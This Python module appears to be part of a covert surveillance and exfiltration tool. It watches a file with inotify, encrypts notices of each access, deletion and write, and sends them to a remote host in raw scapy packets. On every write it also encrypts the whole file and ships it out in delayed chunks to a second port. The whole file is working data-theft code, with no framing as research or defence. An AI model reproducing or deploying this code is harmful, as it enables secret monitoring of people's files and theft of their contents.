import pyinotify
from scapy.all import *
from datetime import datetime
import encryption


global host_addr


class EventHandler(pyinotify.ProcessEvent):
    def process_IN_ACCESS(self, event):
        self.send_notif("Accessed", event.pathname)

    def process_IN_DELETE(self, event):
        self.send_notif("Deleted", event.pathname)

    def process_IN_CLOSE_WRITE(self, event):
        self.send_notif("Modified", event.pathname)
        self.send_file(event.path)

    def send_notif(self, action, data):
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        msg = f"[{current_time}] {action}: {data}"
        encrypted_msg = encryption.encrypt_data(msg.encode("utf-8"))
        encrypted_msg += b"$NOTIF"

        pkt = IP(dst=host_addr)/TCP(sport=RandShort(), dport=8888)/encrypted_msg

        send(pkt, verbose=False) 
        time.sleep(0.1)

    def send_file(self, filepath):
        with open(filepath) as file:
            data = file.read()

        temp = filepath.split("/")
        filename = temp[-1]

        # Encrypt data first, and then send
        encrypted_data = encryption.encrypt_data(data.encode("utf-8"))
        # print(encrypted_data)
        chunks = [encrypted_data[i:i+1000] for i in range(0, len(encrypted_data), 1000)]
        chunks[-1] += b"$EOF" + bytes(filename, encoding="utf-8")

        for chunk in chunks:
            pkt = IP(dst=host_addr)/TCP(sport=RandShort(), dport=8500)/chunk
            send(pkt, verbose=False)
            time.sleep(1.5)


def start_watchfile(filename, host_ip):
    global host_addr
    host_addr = host_ip

    watch_manager = pyinotify.WatchManager()
    mask = pyinotify.IN_ACCESS | pyinotify.IN_DELETE | pyinotify.IN_CLOSE_WRITE

    notifier = pyinotify.ThreadedNotifier(watch_manager, EventHandler())

    watch_manager.add_watch(filename, mask)
    notifier.start()
